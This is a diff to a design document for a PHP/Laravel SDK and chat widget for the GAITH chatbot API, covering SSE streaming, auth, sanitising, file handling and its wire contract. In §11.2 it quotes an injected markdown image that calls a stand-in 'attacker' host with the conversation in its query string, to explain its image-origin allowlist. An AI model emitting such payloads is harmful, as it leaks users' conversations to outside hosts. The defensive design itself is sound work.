@@ -3,11 +3,14 @@
 ## 1. What this is and isn't
 
 `osos/gaith-sdk-php` is a **thin, server-side client library**. It runs inside a consuming PHP/Laravel
-backend and talks to GAITH's public chatbot HTTP/SSE API. It ships:
+backend and talks to GAITH's public chatbot HTTP/SSE API. The core (everything outside `src/Laravel/`) ships:
 
 - no server, no UI, no persistence
 - pure request/response (and SSE-stream) plumbing plus typed models
 - a static, chatbot-scoped API key as its entire trust boundary (`X-API-Key`) — never a per-user token
+
+The **optional** Laravel bridge additionally ships opt-in proxy routes plus the prebuilt `<gaith-chat>`
+browser widget (§11), so a host app gets a working chat UI without writing either half itself.
 
 **GAITH is the system of record for chat history.** The consumer is explicitly not expected to store
 messages or transcripts itself; the SDK's `listConversations`/`getMessages` calls exist so a consumer
@@ -211,6 +214,7 @@ passing some other bare string (a conversation id, a message) where a user id wa
 catches the type mismatch instead of the bug surfacing as cross-user data leakage in production.
 
 `ChatEvent` — a closed hierarchy: `MetaEvent`, `TokenEvent`, `ToolCallEvent`, `ToolResultEvent`,
+`HeartbeatEvent` (a comment-only SSE frame — GAITH's ~15s keep-alive; carries nothing, never terminal),
 `FileEvent`, `LimitEvent`, and three terminal events (`DoneEvent`, `ErrorEvent`, `SafetyBlockEvent`).
 `isTerminal(): bool` is `false` on the base class, overridden to `true` on exactly those three — this is
 what `streamChat()`'s resume loop keys off to decide "generator should exit now, cleanly."
@@ -252,6 +256,7 @@ that doesn't should be either a documented, intentional PHP-specific deviation o
 | Multi-chatbot support via named registrations + a factory | ✅ (DI-based) | ✅ (Laravel bridge) | Matched, PHP-idiomatic |
 | JSON serialization strategy | source-generated (AOT-friendly) | plain `json_encode`/hydrate-by-hand | Intentionally different — no AOT concern in PHP |
 | Native async streaming (`IAsyncEnumerable`) | ✅ | `Generator` (`yield`), synchronous | Intentionally different — PHP has no true-async equivalent; caller cancellation is a `break` out of the `foreach`, not a `CancellationToken` |
+| SSE keep-alive comments | ignored | surfaced as `HeartbeatEvent` | Intentionally different — a PHP request relaying the stream to a browser (§11) must write *something* during long tool calls or a proxy culls its downstream connection. Consumers that only check `instanceof` for the events they handle are unaffected. Port to .NET if it gains a relay use case. |
 
 **When extending either SDK, check this table first.** A change to the resume protocol, the exception
 hierarchy's shape, or the two-transport split's rules should land in both SDKs (or be added here as a
@@ -276,19 +281,109 @@ Recorded here so they're a decision backlog, not a surprise for the next person 
   full 3-shape leniency `GaithHttpTransport` implements (§5) — a non-2xx on the streaming path with a
   FastAPI-style `detail` body would produce a less-informative exception message than the same error on
   the JSON path.
-- No `LICENSE` file or CI workflow yet, despite `composer.json` declaring `"license": "MIT"`.
+- No `LICENSE` file or CI workflow yet, despite `composer.json` declaring `"license": "MIT"`. A CI job
+  should run the PHP suite on Laravel 10 *and* 12 (the two host apps) and fail if `dist/` is stale.
+- **Widget history loads at most `history_max_messages` (500) from the oldest end** — GAITH pages forward
+  only (`after_seq`), so a longer conversation restores its first 500 messages, not its last.
+- **Each open chat holds one PHP-FPM worker for the whole reply** (§11). Fine at current scale; at high
+  concurrency size the FPM pool for it or move the relay to Octane / a non-blocking proxy.
 
 ## 10. Testing philosophy
 
-Per-layer unit tests, TDD throughout (105 tests at time of writing). The two areas given deliberately
-heavier coverage, because they're the two places a subtle bug has an outsized, hard-to-observe
-consequence:
+Per-layer unit tests, TDD throughout (PHP: 134 on Laravel 12 via `orchestra/testbench`, also run on
+Laravel 10; widget: 44 vitest tests). The two areas given deliberately heavier coverage, because
+they're the two places a subtle bug has an outsized, hard-to-observe consequence:
 
-- **`SseReader`** — chunk-boundary-split frames, multi-`data:`-line joins, comment/heartbeat skipping,
-  trailing-incomplete-frame handling. Tested with real SSE byte strings, not mocked framing.
+- **`SseReader`** — chunk-boundary-split frames, multi-`data:`-line joins, comment-only (heartbeat)
+  frames, trailing-incomplete-frame handling. Tested with real SSE byte strings, not mocked framing.
 - **`GaithChatbotClient::streamChat()`** — every resume-loop branch is a named test: yields-until-done,
   unknown-events-skipped, resumes-within-window, resumes-using-stream-id-only (no last-event-id),
   drop-before-meta-propagates-without-resume, clean-end-without-terminal-stops-without-resume,
   options-cannot-override-authenticated-user. Assertions target the *actual outgoing request* on resume
   (headers, body) via a real `GaithHttpTransport` instance rather than a mock that could silently echo
   back whatever the assertion expects.
+
+## 11. Chat widget: `<gaith-chat>` + bridge routes
+
+### 11.1 Shape
+
+```
+Browser (any framework)            Host Laravel app                         GAITH
+<gaith-chat>  --fetch + SSE-->  GaithChatController (opt-in routes)  --SDK-->  /chat (SSE)
+dist/gaith-chat.js              user = host's own auth, API key here
+```
+
+Two halves, one package, one version. `vendor:publish --tag=gaith-chat-assets` copies the built
+widget into the host's `public/`, so the browser half is always the release that matches the routes.
+That pairing is the main reason both halves live in this repo rather than an npm package.
+
+### 11.2 Decisions and why
+
+- **The browser never talks to GAITH.** The API key is chatbot-scoped, so it stays on the server. The
+  GAITH `external_user_id` comes from `GaithUserResolver` (default: `$request->user()` plus a per-product
+  prefix), never from the request body. An unidentifiable caller gets a 401. It is never given an
+  anonymous id, because that id partitions history.
+- **Routes are off by default** (`widget.enabled`). Enabling them is a security decision: the host must
+  first put its own auth middleware in `widget.middleware`.
+- **Web Component, prebuilt ES2017 bundle.** Both target apps run Angular 5 / TypeScript 2.9, which
+  cannot compile modern libraries. A custom element is plain JS the host's build never touches.
+  Shadow DOM isolates styles both ways. No IE11.
+- **Auth is the host's.** Hosts sign requests differently (ERP: HMAC `X-CSRF-TOKEN` over the body;
+  QHSE: timestamp token), so the widget calls `getHeaders({method, path, body, payload})` per request
+  and holds no auth logic itself.
+- **Model output is untrusted HTML.** Markdown goes through `marked`, then DOMPurify, always. The old
+  Angular widget relied on Angular's sanitizer; a Web Component has none, so this is not optional.
+- **History comes from GAITH** (§1), via `GET {prefix}/conversations/{id}/messages`. Only the
+  conversation id lives in `sessionStorage`. A 404 (expired, or another login in the same tab) starts
+  a fresh conversation.
+- **Per-product colours come from the host backend's config/.env** via `GET {prefix}/config`. They are
+  validated server-side as CSS colours. Precedence: page CSS > backend config > built-in default. The
+  launcher stays hidden until the theme arrives (1.5s fallback), so it never flashes the wrong colour.
+
+- **Files go through the host, never straight from GAITH.** GAITH's `download_url` needs the API key, so it
+  is stripped from `file` events and history. The widget calls `{prefix}/files/{artifact_id}` with the host's
+  auth headers (`fetch` → blob URL, because Bearer-token hosts cannot authenticate a plain `<img src>`).
+  GAITH itself scopes each file to its `(chatbot, external_user_id)`, so one user cannot fetch another's.
+- **Untrusted files are served from the host's own origin**, so nothing scriptable may render there:
+  only PNG/JPEG/GIF/WebP/PDF are `inline`, everything else is `attachment`, with `nosniff` and a
+  sandboxing CSP (PDF skips `sandbox`, which Chrome's viewer refuses). The widget mirrors this: it opens
+  images and PDFs in a tab and only downloads other types, because a blob URL inherits the host origin.
+- **Markdown images load only from allowed origins** (the host's own plus `widget.image_origins`). Others
+  become plain links: an injected `![](https://attacker/?q=<conversation>)` would otherwise leak data the
+  moment it rendered.
+- **Attachments are stored by GAITH, never by the host.** The widget uploads each file as soon as it is
+  picked (`{prefix}/attachments` → `uploadAttachment()` → GAITH's object store, user-scoped, 30-day TTL)
+  and sends the returned ids with the message. The host checks type (from the file's bytes, not the
+  browser's claim) and size before forwarding, and sends the detected type explicitly so GAITH never sees
+  an untyped upload.
+- **The host enforces attachment ownership.** GAITH resolves `attachments` ids by chatbot owner and tenant,
+  not by end user, and then lets a user download any file referenced in their own conversation - so an id
+  borrowed from another user would leak that user's file. The bridge records each upload in the host cache
+  under `(user, artifact_id)` for a day and refuses any other id. This is a GAITH backend gap to raise with
+  the GAITH team (scope `resolve_input_refs` to the external user); until then every host must keep this check.
+- **Rendered rows are reused while unchanged**, and a streaming reply keeps its already-loaded `<img>`
+  nodes, so images never reload (flicker) as later tokens arrive.
+
+### 11.3 The wire contract (public API: add fields, never rename or remove)
+
+| Call | Response |
+|---|---|
+| `GET {prefix}/config` | `{theme: {primary_color?, text_color?}, image_origins: string[], attachments: {enabled, max_files, max_bytes, allowed_types}}` |
+| `POST {prefix}/attachments` (multipart `file`) | 201 `{artifact_id, filename, media_type, size_bytes}`; 413 `file_too_large`; 422 `file_type_not_allowed` / `file_rejected` / `file_missing`; 404 `attachments_disabled` |
+| `GET {prefix}/files/{artifact_id}` | The file's bytes; 404 `file_not_found` (not this user's), 410 `file_expired` |
+| `POST {prefix}/stream` `{message, conversation_id?, attachments?: artifact_id[]}` (422 `attachment_not_found` for an id this user did not upload) | SSE: `meta{conversation_id}`, `token{content}`, `tool_call{tool}`, `tool_result{tool,ok}`, `file{artifact_id,filename,media_type,size_bytes}`, `limit{reason}`, `question{question,options}` (a clarifying question with 2-6 clickable answers - GAITH's `present_options` tool, followed by `done` with `finish_reason: "question"`), `done{message_id,conversation_id,finish_reason}`, `error{code,message}`, `safety_block{}`, plus `: heartbeat` comments |
+| `GET {prefix}/conversations/{id}/messages` | `{messages: [{role, content, created_at, files: [{artifact_id, filename, media_type, size_bytes}], options: string[]}]}` (`options`: the answers to a clarifying question that reply asked, from GAITH's saved `tool_events`), or 404 `{code: "conversation_not_found"}` |
+
+GAITH internals (`stream_id`, `user_message_id`, usage) are never forwarded. Failures inside the stream
+become a terminal `error` frame (`stream_dropped`, `rate_limited`, `gaith_error`, `internal_error`) with a
+generic message. The real cause is logged server-side only. The widget treats a stream that closes
+without `done`/`error` as a failure, so it never spins forever.
+
+### 11.4 Operational notes
+
+- Streaming responses send `X-Accel-Buffering: no` and relay heartbeats. Any other proxy or load
+  balancer in front of the host must not buffer `text/event-stream` and must allow idle reads longer
+  than 15s.
+- Each open chat holds one PHP worker for the length of a reply (see §9).
+- `examples/widget-demo/server.php` implements the same contract without Laravel (with a fake mode) for
+  frontend work. Keep it in step with `GaithChatController`.
